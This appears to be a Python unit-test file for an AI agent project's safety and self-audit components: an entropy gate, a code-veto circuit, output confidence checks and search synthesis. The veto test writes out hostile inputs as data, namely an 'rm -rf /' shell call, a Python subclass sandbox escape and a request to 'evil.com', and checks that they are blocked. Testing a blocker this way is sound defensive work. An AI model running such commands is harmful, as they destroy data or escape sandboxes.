
import sys
import os
import unittest
from unittest.mock import MagicMock

# Mock external dependencies
sys.modules["torch"] = MagicMock()
sys.modules["torch.nn"] = MagicMock()
sys.modules["torch.nn.functional"] = MagicMock()
sys.modules["transformers"] = MagicMock()
sys.modules["accelerate"] = MagicMock()
sys.modules["requests"] = MagicMock()
sys.modules["bs4"] = MagicMock()
sys.modules["duckduckgo_search"] = MagicMock()
sys.modules["faiss"] = MagicMock()

# Add src to path
sys.path.append(os.path.abspath("src"))

from remember_me.core.nervous_system import SignalGate, VetoCircuit, Proprioception
from remember_me.integrations.agent import SovereignAgent

class TestSovereignEnhancements(unittest.TestCase):
    def setUp(self):
        self.mock_engine = MagicMock()
        self.mock_engine.generate_response.return_value = "Mocked Response"
        self.mock_tools = MagicMock()
        self.mock_tools.web_search.return_value = "Mock Search Result"
        self.mock_tools.generate_image.return_value = "mock_image.png"
        self.signal_gate = SignalGate()
        self.veto_circuit = VetoCircuit()
        self.proprioception = Proprioception()
        self.agent = SovereignAgent(self.mock_engine, self.mock_tools)

    def test_signal_gate_entropy(self):
        low_ent = "aaaaaaaaaaaaaaaaaaaa" * 10
        res = self.signal_gate._calculate_entropy(low_ent)
        self.assertLess(res, 0.3)
        import random
        high_ent = "".join([chr(random.randint(48, 122)) for _ in range(100)])
        res = self.signal_gate._calculate_entropy(high_ent)
        self.assertGreater(res, 0.5)

    def test_veto_dangerous_code(self):
        dangerous_code = "import os; os.system('rm -rf /')"
        signal = {"entropy": 0.5, "threat": 0.0, "urgency": 0.0}
        accepted, reason, _ = self.veto_circuit.audit(signal, dangerous_code)
        self.assertFalse(accepted)

        # Test new patterns
        subclass_exploit = "[].__class__.__base__.__subclasses__()"
        accepted, reason, _ = self.veto_circuit.audit(signal, subclass_exploit)
        self.assertFalse(accepted)
        print(f"Subclass Exploit Vetoed: {reason}")

        requests_exploit = "import requests; requests.get('http://evil.com')"
        accepted, reason, _ = self.veto_circuit.audit(signal, requests_exploit)
        self.assertFalse(accepted)

    def test_proprioception_audit(self):
        bad_response = "I'm not sure, maybe it's 5? However, I could be wrong."
        audit = self.proprioception.audit_output(bad_response, "context")
        self.assertTrue(audit['regenerate'])

    def test_platform_detection_fallback(self):
        import remember_me.core.nervous_system as ns
        orig_psutil = ns.PSUTIL_AVAILABLE
        ns.PSUTIL_AVAILABLE = False

        gate = SignalGate()
        gate._detect_gpu = MagicMock(return_value=False)

        platform = gate._detect_platform()
        print(f"Detected Platform (Fallback): {platform}")
        self.assertIn(platform, ["GEMINI (Fallback)", "GEMINI (CPU)", "PERPLEXITY"])

        ns.PSUTIL_AVAILABLE = orig_psutil

    def test_hive_mind_search(self):
        def mock_search(q):
            return f"Result for {q}"
        self.mock_tools.web_search.side_effect = mock_search

        res = self.agent._hive_mind_search("AI ethics", "TURTLE_INTEGRITY")
        print(f"Hive Mind Result:\n{res}")
        self.assertIn("AI ethics definitive guide", res)
        self.assertIn("AI ethics latest research 2024", res)
        self.assertEqual(self.mock_tools.web_search.call_count, 3)

    def test_active_regeneration(self):
        bad_response = "I'm not sure. However, it might be..."
        better_response = "The answer is 42. " * 20 + "Source: Wikipedia.\n```python\nprint(42)\n```"

        # Side effect: 1. Initial Call -> Bad
        #              2. Retry 1 -> Bad
        #              3. Retry 2 -> Better (Should pass audit if conf >= 0.9)
        # Note: Proprioception logic: Base 0.7 + Length 0.1 (>200) + Citation 0.1 = 0.9.
        self.mock_engine.generate_response.side_effect = [bad_response, bad_response, better_response]

        # Mock internal components to bypass complex logic
        self.agent.signal_gate.analyze = MagicMock(return_value={
            "entropy": 0.1, "urgency": 0.1, "threat": 0.0, "mode": "INTERACTIVE", "platform": "TEST"
        })
        self.agent.veto_circuit.audit = MagicMock(return_value=(True, "OK", None))
        self.agent.velocity = MagicMock()
        self.agent.velocity.determine_mode.return_value = "INTERACTIVE"

        # Run agent
        res = self.agent.run("test query", "context")

        # Verify calls
        # We expect 3 calls to generate_response
        # But wait, T-Cell verification might trigger another call if confidence < 0.8?
        # Better response confidence should be 0.9.
        print(f"Generate Response Call Count: {self.mock_engine.generate_response.call_count}")
        self.assertEqual(self.mock_engine.generate_response.call_count, 3)
        self.assertIn("The answer is 42", res["response"])

    def test_haiyue_synthesis(self):
        simulations = {
            "OPTIMISTIC": "Go for it!",
            "NEUTRAL": "Be careful.",
            "PESSIMISTIC": "Don't do it."
        }
        res = self.agent._synthesize_microcosm_input("Should I invest?", simulations)
        print(f"Synthesis Prompt:\n{res}")
        self.assertIn("SYNTHESIS INSTRUCTION", res)
        self.assertIn("Pessimistic (Risk)", res)

if __name__ == "__main__":
    unittest.main()
